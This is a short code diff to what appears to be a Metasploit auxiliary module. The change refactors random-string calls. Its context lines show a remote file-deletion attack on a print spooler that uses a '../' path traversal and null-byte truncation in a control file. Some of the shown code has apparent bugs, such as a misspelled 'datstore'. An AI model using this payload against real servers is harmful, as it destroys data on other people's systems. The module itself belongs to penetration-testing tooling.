@@ -51,9 +51,9 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 	
 	
-		r_hostname = rand_text_alpha(rand(8)+1)
-		r_user     = rand_text_alpha(rand(8)+1)
-		r_spool    = rand_text_alpha(rand(8)+1)
+		r_hostname = Rex::Text.rand_text_alpha(rand(8)+1)
+		r_user     = Rex::Text.rand_text_alpha(rand(8)+1)
+		r_spool    = Rex::Text.rand_text_alpha(rand(8)+1)
 		
 		# Create a simple control file...
 		control = "H#{r_hostname}\nP#{r_user}\n";
@@ -78,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
 		# null byte will prevent the parser from processing the other paths.
 		control << "U" + ("../" * 10) + "#{datastore['RPATH']}\x00\n"
 
-		dataf = rand_text_alpha(100)+1
+		dataf = Rex::Text.rand_text_alpha(100)+1
 		
 		print_status("Deleting #{datstore['RPATH']}...")
 		if (not (
